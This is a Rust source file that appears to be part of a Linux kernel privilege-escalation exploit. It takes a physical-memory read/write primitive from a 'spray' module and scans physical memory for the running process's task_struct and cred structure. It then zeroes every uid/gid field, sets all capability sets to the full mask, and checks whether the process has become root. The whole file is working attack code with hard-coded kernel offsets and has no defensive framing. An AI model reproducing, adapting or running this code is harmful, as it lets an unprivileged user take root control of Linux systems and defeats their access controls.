//! Credential overwriting using physical memory access

use super::spray::PhysicalMemoryAccess;
use log::{info, debug, error};

// Offsets for x86_64 (vary by kernel config, these are common defaults)
const OFFSET_COMM: usize = 0x7b0;
const OFFSET_CRED: usize = 0x738;
const OFFSET_REAL_CRED: usize = 0x730;

// struct cred layout (sequential u32s for uid/gid fields)
const CRED_UID: usize = 4;   // kuid_t uid
const CRED_GID: usize = 8;   // kgid_t gid  
const CRED_SUID: usize = 12;
const CRED_SGID: usize = 16;
const CRED_EUID: usize = 20;
const CRED_EGID: usize = 24;
const CRED_FSUID: usize = 28;
const CRED_FSGID: usize = 32;

// Capabilities start at offset 40 (kernel_cap_t = u64 on x86_64)
const CRED_CAP_INHERITABLE: usize = 40;
const CRED_CAP_PERMITTED: usize = 48;
const CRED_CAP_EFFECTIVE: usize = 56;
const CRED_CAP_BSET: usize = 64;
const CRED_CAP_AMBIENT: usize = 72;

const CAP_FULL_SET: u64 = 0x3ffffffffff;

fn get_comm() -> [u8; 16] {
    let mut name = [0u8; 16];
    if let Ok(s) = std::fs::read_to_string("/proc/self/comm") {
        let bytes = s.trim().as_bytes();
        let len = bytes.len().min(15);
        name[..len].copy_from_slice(&bytes[..len]);
    }
    name
}

pub fn gain_root(phys: &PhysicalMemoryAccess) -> Result<(), String> {
    let comm = get_comm();
    let our_uid = unsafe { libc::getuid() };
    let our_gid = unsafe { libc::getgid() };

    info!("[Esc] Searching for task (comm={}, uid={})", 
        String::from_utf8_lossy(&comm).trim_matches('\0'), our_uid);

    // Scan for task_struct by finding comm field
    let scan_end: u64 = 512 * 1024 * 1024; // 512MB
    let mut found_task: u64 = 0;

    for addr in (0..scan_end).step_by(8) {
        let mut buf = [0u8; 16];
        phys.read_phys(addr, &mut buf);

        if buf == comm {
            let task_base = addr.saturating_sub(OFFSET_COMM as u64);
            let cred = phys.read_u64(task_base + OFFSET_CRED as u64);
            let real_cred = phys.read_u64(task_base + OFFSET_REAL_CRED as u64);

            // Validate: kernel space pointers
            if cred > 0xffff800000000000 && real_cred > 0xffff800000000000 {
                debug!("[Esc] Candidate task @ 0x{:x}, cred=0x{:x}", task_base, cred);
                found_task = task_base;
                break;
            }
        }
    }

    if found_task == 0 {
        return Err("task_struct not found".into());
    }

    // Find cred structure by matching uid/gid pattern
    let mut found_cred: u64 = 0;

    for addr in (0..scan_end).step_by(4) {
        let mut buf = [0u8; 32];
        phys.read_phys(addr, &mut buf);

        // Pattern: uid(4) gid(4) suid(4) sgid(4) euid(4) egid(4)
        let uid = u32::from_ne_bytes([buf[0], buf[1], buf[2], buf[3]]);
        let gid = u32::from_ne_bytes([buf[4], buf[5], buf[6], buf[7]]);
        let suid = u32::from_ne_bytes([buf[8], buf[9], buf[10], buf[11]]);
        let sgid = u32::from_ne_bytes([buf[12], buf[13], buf[14], buf[15]]);
        let euid = u32::from_ne_bytes([buf[16], buf[17], buf[18], buf[19]]);
        let egid = u32::from_ne_bytes([buf[20], buf[21], buf[22], buf[23]]);
        let fsuid = u32::from_ne_bytes([buf[24], buf[25], buf[26], buf[27]]);
        let fsgid = u32::from_ne_bytes([buf[28], buf[29], buf[30], buf[31]]);

        if uid == our_uid && gid == our_gid && 
           suid == our_uid && sgid == our_gid &&
           euid == our_uid && egid == our_gid &&
           fsuid == our_uid && fsgid == our_gid {
            // This looks like our cred (uid field is at offset 4 from cred base)
            found_cred = addr - CRED_UID as u64;
            info!("[Esc] Found cred @ 0x{:x}", found_cred);
            break;
        }
    }

    if found_cred == 0 {
        return Err("cred not found".into());
    }

    // Overwrite with root credentials (write u32s individually, not u64)
    info!("[Esc] Overwriting credentials...");

    let zero_u32: [u8; 4] = 0u32.to_ne_bytes();
    let cap_bytes: [u8; 8] = CAP_FULL_SET.to_ne_bytes();

    // Write each uid/gid field individually
    phys.write_phys(found_cred + CRED_UID as u64, &zero_u32);
    phys.write_phys(found_cred + CRED_GID as u64, &zero_u32);
    phys.write_phys(found_cred + CRED_SUID as u64, &zero_u32);
    phys.write_phys(found_cred + CRED_SGID as u64, &zero_u32);
    phys.write_phys(found_cred + CRED_EUID as u64, &zero_u32);
    phys.write_phys(found_cred + CRED_EGID as u64, &zero_u32);
    phys.write_phys(found_cred + CRED_FSUID as u64, &zero_u32);
    phys.write_phys(found_cred + CRED_FSGID as u64, &zero_u32);

    // Write capabilities (u64 each)
    phys.write_phys(found_cred + CRED_CAP_INHERITABLE as u64, &cap_bytes);
    phys.write_phys(found_cred + CRED_CAP_PERMITTED as u64, &cap_bytes);
    phys.write_phys(found_cred + CRED_CAP_EFFECTIVE as u64, &cap_bytes);
    phys.write_phys(found_cred + CRED_CAP_BSET as u64, &cap_bytes);
    phys.write_phys(found_cred + CRED_CAP_AMBIENT as u64, &cap_bytes);

    // Verify
    let new_uid = unsafe { libc::getuid() };
    let new_euid = unsafe { libc::geteuid() };

    if new_uid == 0 && new_euid == 0 {
        info!("[Esc] SUCCESS uid={} euid={}", new_uid, new_euid);
        Ok(())
    } else {
        error!("[Esc] Failed uid={} euid={}", new_uid, new_euid);
        Err("cred overwrite failed".into())
    }
}
